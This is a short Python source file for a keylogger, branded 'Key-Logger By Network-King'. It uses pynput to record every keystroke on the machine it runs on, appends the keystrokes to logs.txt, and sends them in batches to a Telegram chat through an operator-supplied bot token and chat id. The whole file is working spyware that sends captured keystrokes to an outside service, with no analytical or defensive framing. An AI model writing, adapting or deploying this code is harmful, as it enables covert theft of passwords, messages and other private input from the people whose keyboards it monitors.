import telebot
from pynput.keyboard import Listener
import argparse
from termcolor import colored 
import pyfiglet
from pyfiglet import Figlet

f2 = Figlet(font='slant') 
print(colored(f2.renderText('Key-Logger'), 'cyan'))

f3 = Figlet(font='small') 
print(colored(f3.renderText('By Network-King'), 'magenta'))

parser = argparse.ArgumentParser(description="Xploiter's Keylogger")
parser.add_argument("--token",type=str, required=True, help="Telegram token to send" )

bot_token = input(colored("Enter the telegram token to send : ", "cyan"))

chat_id = input(colored("Enter the telegram chat id to send : ","cyan"))

bot = telebot.TeleBot(bot_token)
keys = ""

def send_telegram(message):
    try:
        bot.send_message(chat_id, message)
    except:
        pass

def write_to_file(keys):
    with open("logs.txt", "a") as file:
        file.write(keys + "\n")

def on_press(key):
    global keys
    try:
        keys +=   key.char
    except AttributeError:
        keys += " " + str(key) + " "

    if len(keys) > 10:
        send_telegram(keys)
        write_to_file(keys)
        print(colored("[+] Captured keys saved in logs.txt"))
        keys = ""

with Listener(on_press=on_press) as listener:
    listener.join()
